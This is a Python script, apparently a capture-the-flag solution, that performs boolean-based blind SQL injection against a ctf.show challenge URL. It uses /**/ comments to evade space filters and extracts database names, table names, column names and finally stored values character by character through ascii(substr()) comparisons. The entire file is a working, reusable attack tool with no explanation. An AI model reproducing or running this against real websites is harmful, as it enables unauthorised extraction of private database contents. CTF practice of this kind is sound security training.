import requests
import os

url = 'http://988eb176-ac85-4d66-aaa4-57b6d31be7fd.chall.ctf.show/index.php'
basepayload = '?id=-1/**/or/**/'

have = True
dbs = ''
print("trying dbs:")
for i in range(1,100):
    if have:
        have = False
        for j in range(31,128):
            #payload = url + basepayload + 'ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())from/**/' + str(i) + '/**/for/**/1))=' + str(j)
            payload = url + basepayload + 'ascii(substr((select/**/group_concat(schema_name)/**/from/**/information_schema.schemata/**/limit/**/1/**/offset/**/0)from/**/' + str(i) + '/**/for/**/1))=' + str(j)
            #print(payload)
            r = requests.get(payload)
            if 'If' in r.text:
                dbs = dbs + chr(j)
                print(dbs)
                have = True
                break
os.system("clear")

print("choose db:" + dbs)
db = input()
have = True
tables = ''
print("trying tables:")
for i in range(1,100):
    if have:
        have = False
        for j in range(31,128):
            payload = url + basepayload + 'ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=\"' + db + '\")from/**/' + str(i) + '/**/for/**/1))=' + str(j)
            r = requests.get(payload)
            if 'If' in r.text:
                tables = tables + chr(j)
                print(tables)
                have = True
                break
os.system("clear")

print("db:"+db+"\nchoose table:"+tables)
table = input()
have = True
columns = ''
print("trying columns:")
for i in range(1,100):
    if have:
        have = False
        for j in range(31,128):
            payload = url + basepayload + 'ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=\"' + table + '\")from/**/' + str(i) + '/**/for/**/1))=' + str(j)
            r = requests.get(payload)
            if 'If' in r.text:
                columns = columns + chr(j)
                print(columns)
                have = True
                break
os.system("clear")

print("db:"+db+"\ntable:"+table+"\nchoose columns:"+columns)
column = input()
have = True
value = ''
print("trying value:")
for i in range(1,100):
    if have:
        have = False
        for j in range(31,128):
            payload = url + basepayload + 'ascii(substr((select/**/group_concat(' + column + ')/**/from/**/' + db + '.' + table + ')/**/from/**/' + str(i) + '/**/for/**/1))=' + str(j)
            r = requests.get(payload)
            if 'If' in r.text:
                value = value + chr(j)
                print(value)
                have = True
                break
os.system("clear")

print("db:"+db+"\ntable:"+table+"\ncolumn:"+column+"\nvalue:"+value)
